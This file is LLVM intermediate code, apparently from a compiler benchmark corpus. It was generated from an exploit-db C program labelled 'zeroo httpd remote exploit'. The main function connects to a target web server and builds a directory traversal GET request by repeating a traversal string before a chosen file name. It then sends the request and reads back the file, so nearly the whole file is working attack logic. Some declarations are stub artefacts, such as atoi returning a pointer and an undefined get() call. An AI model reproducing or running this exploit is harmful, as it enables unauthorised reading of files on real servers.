; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22063.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22063.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [10 x i8] c"UC-zeroo\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c"zeroo httpd remote exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"[mikecc/unixclan] [http://uc.zemos.net/]\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [71 x i8] c"%s host port file traverse_amount (>= 1 [keep incrementing till hit])\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"Host lookup error.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [16 x i8] c"sock() failed.\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"Connecting...\0A\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"Failed to connect to %s.\0A\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c"Setting up exploit string..\0A\00", align 1
@.str.9 = private unnamed_addr constant [31 x i8] c"Error. Limit 1024 characters.\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"GET /\00", align 1
@FOO = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [26 x i8] c"\09Inserting file string..\0A\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"Sending exploit string...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i16, align 2
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp ne i32 %19, 5
  br i1 %20, label %21, label %26

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.3, i64 0, i64 0), i8* %24)
  store i32 0, i32* %3, align 4
  br label %119

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  store i8* %29, i8** %10, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 2
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @atoi(i8* %32)
  %34 = ptrtoint i8* %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 3
  %37 = load i8*, i8** %36, align 8
  store i8* %37, i8** %11, align 8
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 4
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @atoi(i8* %40)
  %42 = ptrtoint i8* %41 to i32
  store i32 %42, i32* %9, align 4
  %43 = load i8*, i8** %10, align 8
  %44 = call %struct.hostent* @gethostbyname(i8* %43)
  store %struct.hostent* %44, %struct.hostent** %7, align 8
  %45 = icmp eq %struct.hostent* %44, null
  br i1 %45, label %46, label %48

46:                                               ; preds = %26
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %119

48:                                               ; preds = %26
  %49 = load i32, i32* @AF_INET, align 4
  %50 = load i32, i32* @SOCK_STREAM, align 4
  %51 = call i32 @socket(i32 %49, i32 %50, i32 0)
  store i32 %51, i32* %8, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %53, label %55

53:                                               ; preds = %48
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %119

55:                                               ; preds = %48
  %56 = load i32, i32* @AF_INET, align 4
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %56, i32* %57, align 4
  %58 = load i16, i16* %12, align 2
  %59 = call i32 @htons(i16 signext %58)
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %59, i32* %60, align 4
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %62 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %61, i32 0, i32 0
  %63 = load %struct.hostent*, %struct.hostent** %7, align 8
  %64 = getelementptr inbounds %struct.hostent, %struct.hostent* %63, i32 0, i32 1
  %65 = load i32, i32* %64, align 4
  %66 = load %struct.hostent*, %struct.hostent** %7, align 8
  %67 = getelementptr inbounds %struct.hostent, %struct.hostent* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @memcpy(i32* %62, i32 %65, i32 %68)
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %71 = load i32, i32* %8, align 4
  %72 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %73 = call i32 @connect(i32 %71, %struct.sockaddr* %72, i32 12)
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %78

75:                                               ; preds = %55
  %76 = load i8*, i8** %10, align 8
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0), i8* %76)
  store i32 0, i32* %3, align 4
  br label %119

78:                                               ; preds = %55
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0))
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, 8
  %82 = load i8*, i8** %11, align 8
  %83 = call i32 @strlen(i8* %82)
  %84 = add nsw i32 %81, %83
  %85 = icmp sgt i32 %84, 1024
  br i1 %85, label %86, label %88

86:                                               ; preds = %78
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %119

88:                                               ; preds = %78
  %89 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %90 = call i32 @sprintf(i8* %89, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %14, align 4
  br label %91

91:                                               ; preds = %99, %88
  %92 = load i32, i32* %14, align 4
  %93 = load i32, i32* %9, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %102

95:                                               ; preds = %91
  %96 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %97 = load i8*, i8** @FOO, align 8
  %98 = call i32 @strcat(i8* %96, i8* %97)
  br label %99

99:                                               ; preds = %95
  %100 = load i32, i32* %14, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %14, align 4
  br label %91

102:                                              ; preds = %91
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %104 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %105 = load i8*, i8** %11, align 8
  %106 = call i32 @strcat(i8* %104, i8* %105)
  %107 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %108 = call i32 @strcat(i8* %107, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0))
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  %110 = load i32, i32* %8, align 4
  %111 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %112 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %113 = call i32 @strlen(i8* %112)
  %114 = call i32 @write(i32 %110, i8* %111, i32 %113)
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @get(i32 %115)
  %117 = load i32, i32* %8, align 4
  %118 = call i32 @close(i32 %117)
  store i32 0, i32* %3, align 4
  br label %119

119:                                              ; preds = %102, %86, %75, %53, %46, %21
  %120 = load i32, i32* %3, align 4
  ret i32 %120
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 signext) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @get(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
